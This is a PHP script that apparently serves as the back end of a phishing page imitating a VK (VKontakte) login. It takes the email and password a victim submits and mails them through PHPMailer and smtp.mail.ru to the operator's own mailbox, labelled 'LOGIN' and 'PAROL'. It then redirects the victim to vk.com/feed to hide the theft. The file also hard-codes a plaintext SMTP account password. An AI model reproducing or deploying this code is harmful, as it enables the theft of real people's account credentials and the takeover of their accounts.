<?php 

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require_once dirname(__FILE__)."/PHPMailer-master/src/PHPMailer.php";
require_once dirname(__FILE__)."/PHPMailer-master/src/SMTP.php";
require_once dirname(__FILE__)."/PHPMailer-master/src/Exception.php";


$login=$_POST['email'];
$password=$_POST['password'];

$mail = new PHPMailer(true);

try {
    //Server settings
    // $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      // Enable verbose debug output
    $mail->isSMTP();                                            // Send using SMTP
    $mail->Host       = 'smtp.mail.ru';                    // Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
    $mail->Username   = 'vanyusha_ivan_2021@bk.ru';                     // SMTP username
    $mail->Password   = '84949Jionk344jj';                               // SMTP password
    $mail->SMTPSecure = ssl;         // Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` also accepted
    $mail->Port       = 465;                                    // TCP port to connect to

    //Recipients
    $mail->setFrom('vanyusha_ivan_2021@bk.ru', 'LOH');
    $mail->addAddress('vanyusha_ivan_2021@bk.ru', 'Joe User');     // Add a recipient
               // Name is optional
    // $mail->addReplyTo('info@example.com', 'Information');
    // $mail->addCC('cc@example.com');
    // $mail->addBCC('bcc@example.com');

    // Attachments
    // $mail->addAttachment('/var/tmp/file.tar.gz');         // Add attachments
    // $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name

    // Content
    $mail->isHTML(true);                                  // Set email format to HTML
    $mail->Subject = 'VK';
    $mail->Body    = 'LOGIN:'.$login.'</br>PAROL:'.$password;
    $mail->AltBody = 'LOGIN:'.$login.'</br>PAROL:'.$password;

    $mail->send();
    
    header ('Location:https://vk.com/feed');  // перенаправление на нужную страницу
  	exit();    // прерываем работу скрипта, чтобы забыл о прошлом


} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}


?>